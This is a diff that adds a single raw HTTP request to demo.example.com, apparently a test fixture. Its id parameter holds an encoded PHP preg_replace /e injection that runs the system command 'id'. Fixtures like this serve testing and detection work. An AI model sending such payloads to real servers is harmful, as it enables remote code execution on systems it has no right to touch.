@@ -1,0 +1,4 @@
+GET /a?id=preg_replace(\u0022/test/e\u0022,\u0022system(\u0027id\u0027)\u0022,\u0022test\u0022) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
